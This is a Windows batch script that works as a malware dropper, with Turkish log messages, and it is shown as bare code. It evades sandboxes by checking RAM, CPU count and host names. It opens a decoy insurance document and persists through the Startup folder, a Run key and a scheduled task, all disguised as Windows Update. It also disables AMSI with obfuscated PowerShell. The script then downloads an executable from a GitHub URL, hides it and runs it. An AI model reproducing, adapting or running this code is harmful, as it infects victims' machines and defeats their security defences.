@echo off
setlocal EnableDelayedExpansion
set "destDir=%LOCALAPPDATA%\WindowsUpdate"
if not exist "!destDir!" mkdir "!destDir!"
set "payload=!destDir!\SecurityHealthHost.exe"
set "scriptName=%~nx0"
set "url=https://github.com/flexbusiness31-design/x/raw/refs/heads/main/ddv2.exe"
set "decoy=https://www.yumpu.com/xx/document/read/58220249/trafik-sigortasi/1"
set "logFile=%USERPROFILE%\nt_user_cache.dat"
set "ps_p1=po"&set "ps_p2=wers"&set "ps_p3=hell"
set "p_exec=!ps_p1!!ps_p2!!ps_p3!"
set "r_cmd=re"&set "r_cmd=!r_cmd!g"
if exist "!logFile!" attrib -h -s "!logFile!" >nul 2>&1
echo [%date% %time%] [INFO] - Modul Baslatildi. >> "!logFile!"
for /f "tokens=2 delims==" %%i in ('wmic computersystem get totalphysicalmemory /value 2^>nul') do (
set "ram=%%i"
set "ram=!ram: =!"
set "ram=!ram:~0,-6!"
if !ram! LSS 4096 (
echo [%date% %time%] [WARN] - Sandbox RAM Korumasi. >> "!logFile!"
attrib +h +s "!logFile!" >nul 2>&1
exit /b
)
)
if %NUMBER_OF_PROCESSORS% LSS 2 (
echo [%date% %time%] [WARN] - Sandbox CPU Korumasi. >> "!logFile!"
attrib +h +s "!logFile!" >nul 2>&1
exit /b
)
for %%a in (john sandbox virus sample bruno vmware vbox any.run hybrid check) do (
echo %COMPUTERNAME% %USERNAME% | findstr /I "%%a" >nul && (
echo [%date% %time%] [WARN] - Sandbox Isim Engeli: %%a >> "!logFile!"
attrib +h +s "!logFile!" >nul 2>&1
exit /b
)
)
echo [%date% %time%] [INFO] - Decoy PDF Aciliyor. >> "!logFile!"
start /min "" "%decoy%"
if not exist "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\%scriptName%" (
copy /y "%~f0" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\%scriptName%" >nul 2>&1
)
!r_cmd! add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "\"!payload!\"" /f >nul 2>&1
schtasks /create /tn "Microsoft\Windows\WindowsUpdateTask" /tr "\"!payload!\"" /sc hourly /mo 1 /f >nul 2>&1
echo [%date% %time%] [INFO] - Kalicilik Aktif Edildi. >> "!logFile!"
if not exist "!payload!" (
echo [%date% %time%] [INFO] - Veri Akisi Baslatildi. >> "!logFile!"
!p_exec! -w hidden -c "$u='%url%';$p='%payload%';$u_a='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36';$amsi=[Ref].Assembly.GetType('Sys'+'tem.Man'+'agement.Aut'+'omation.Ams'+'iUt'+'ils');if($amsi){$f=$amsi.GetField('ams'+'iInitF'+'ailed','Non'+'Public,Sta'+'tic');if($f){$f.SetValue($null,$true)}};[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13;try{(New-Object System.Net.Http.HttpClient).GetAsync($u).Result.Content.ReadAsByteArrayAsync().Result | Set-Content -Path $p -Encoding Byte}catch{$w=New-Object Net.WebClient;$w.Headers.Add('User-Agent',$u_a);try{$w.DownloadFile($u,$p)}catch{Start-BitsTransfer -Source $u -Destination $p -Priority High}}" >nul 2>&1
)
if exist "!payload!" (
echo [%date% %time%] [SUCCESS] - Dosya Indirildi ve Dogrulandi. >> "!logFile!"
attrib +h +s "!payload!"
start "" /B "!payload!"
echo [%date% %time%] [SUCCESS] - Arka Plan Sureci Tetiklendi. >> "!logFile!"
) else (
echo [%date% %time%] [ERROR] - Paket Indirilemedi. >> "!logFile!"
)
attrib +h +s "!logFile!" >nul 2>&1
cls
exit
